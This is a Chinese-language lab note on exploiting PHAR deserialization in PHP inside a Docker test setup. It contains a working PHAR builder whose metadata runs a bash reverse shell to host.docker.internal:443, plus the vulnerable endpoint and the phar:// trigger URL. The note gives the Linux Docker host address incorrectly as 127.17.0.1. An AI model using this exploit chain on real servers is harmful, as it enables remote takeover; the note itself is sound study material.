# PHAR Deserialization & Reverse Shell Exploitation in PHP (Docker Test)

這篇筆記整理了從 PHAR 反序列化漏洞原理，到在 Docker 測試環境下成功觸發 reverse shell 的完整流程。

---

## 1. 漏洞背景

PHAR 文件可以包含序列化的 metadata，PHP 在處理 **phar://** 協議時，如果對 PHAR 執行文件操作（例如 `file_get_contents`、`copy` 等），就會自動 **反序列化 metadata**。若 metadata 中包含可被魔法方法利用的 POP chain，攻擊者就能達成 RCE（Remote Code Execution）。

### 觸發條件

1. Web 應用允許上傳 PHAR 文件（或使用 PHAR polyglot）。
2. PHP 有呼叫文件操作函數 (`file_get_contents`, `file_exists`, `copy`...)。
3. 存在可利用的 class（包含 magic method，如 `__destruct` 或 `__wakeup`）。

---

## 2. 漏洞原理
以下程式碼表示模擬一些可能會出現在常用框架中的第三方函式庫
```php
class PDFGenerator {
    public $callback;
    public $fileName;

    function __destruct() {
        call_user_func($this->callback, $this->fileName);
    }
}
```
`__destruct()` 中使用 `call_user_func()` 呼叫 `$callback`，並傳 `$fileName`。

我們可以透過 `PHAR metadata` 修改這兩個屬性，將 `$callback` 指向 `system`，`$fileName` 設置命令。

---

## 3. 攻擊流程
### 3.1 建立 PHAR 文件

```php
<?php
class PDFGenerator {}

// POP chain payload
$evil = new PDFGenerator();
$evil->callback = "system";
$evil->fileName = "bash -c 'bash -i >& /dev/tcp/host.docker.internal/443 0>&1' &";

// 刪除舊檔案
@unlink("evil.phar");

// 建立 PHAR
$phar = new Phar("evil.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->addFromString("dummy.txt", "dummy");
$phar->setMetadata($evil);
$phar->stopBuffering();
```


## 3.2 觸發反序列化
- PHP 端範例：
```php
<?php
$file = $_GET['file'];
echo file_get_contents($file);
```

- 使用 GET 參數：
`http://example.com/index.php?file=phar:///var/www/html/uploads/evil.phar/dummy.txt`

訪問時會自動反序列化 PHAR metadata，觸發 `__destruct()`。

---
## 4. Docker 測試注意點

- **host.docker.internal**：在 macOS / Windows Docker Desktop 可用；Linux 可以用預設的 `127.17.0.1`。
- **stdout / stdin 卡住問題**：
  - `bash -i` 在 web server 下容易卡住，使用背景化 `&` 或 `nohup` 解決。 
  - 範例 payload：
    ```php
    $evil->fileName = "bash -c 'bash -i >& /dev/tcp/host.docker.internal/443 0>&1' &";
    ```

---

## 5. 完整流程總結

1. 確認目標 PHP 有文件操作函數。
2. 找到可利用 class（有 magic method 可被反序列化觸發）。
3. 建立 PHAR 文件：
   - 添加 dummy.txt
   - 設置 metadata 為可控制的 class 物件
4. 訪問 `phar://` URL，觸發反序列化。
5. 使用背景化命令或 `nohup` 避免 web server 阻塞。
6. 測試 reverse shell 連線。

---

## 6. 難點
- 一開始不理解POP (Property Oriented Programming) 的原理不知道是需要有相應的 class 而不是任意class都可以執行 [這篇文章](https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability) 看懂之後才知道 POP 的確切機制以及利用方法
- 建立這個reverse shell的難點最大的其實是由於`call_user_func`無法持續執行互動式操作（原理待補充）所以要加上 `&` 使其能夠在背景執行（但是網頁會一直loading直到reverse shell被關閉 而且就算網頁關閉reverse shell任然可以執行

## 7. 參考資料
https://ithelp.ithome.com.tw/articles/10279849
https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability
https://www.keysight.com/blogs/en/tech/nwvs/2020/07/23/exploiting-php-phar-deserialization-vulnerabilities-part-1
https://www.anquanke.com/post/id/162506
https://forum.butian.net/share/2678